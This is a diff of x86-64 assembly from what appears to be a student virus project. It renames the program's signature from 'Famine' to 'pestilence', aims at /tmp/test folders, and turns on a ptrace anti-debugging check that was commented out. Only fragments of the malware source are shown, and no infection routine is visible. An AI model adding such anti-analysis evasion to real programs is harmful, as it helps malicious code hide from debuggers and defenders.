@@ -1,11 +1,4 @@
-[bits 64]
-
-section .text
-    global _start
-
-_start:
-    mov rax, 60
-    syscall; SYSCALLS
+; SYSCALLS
 %define SYS_EXIT		60
 %define SYS_OPEN		2
 %define SYS_CLOSE	   3
@@ -82,11 +75,11 @@ _start:
 	mov r15, rsp
 	mov byte [r15 + 550], 0										; 0 for /tmp/test, 1 for /tmp/test2
 
-	; mov rax, SYS_PTRACE											; anti-debugging
-	; xor rdi, rdi
-	; syscall
-	; cmp rax, 0
-	; jl cleanup
+	mov rax, SYS_PTRACE											; anti-debugging
+	xor rdi, rdi
+	syscall
+	cmp rax, 0
+	jl cleanup
 
 	call set_folder_chdir
 	chdir:
@@ -303,8 +296,8 @@ set_folder2:
 set_folder_chdir2:
 	call chdir
 	db `/tmp/test2\0`
-famine:
-	db 'F4M1N3 v1.0 by darodrig', 0
+pestilence:
+	db 'pestilence v1.0 by darodrig', 0
 err:
 	mov rax, SYS_EXIT
 	mov rdi, 0xfffffff
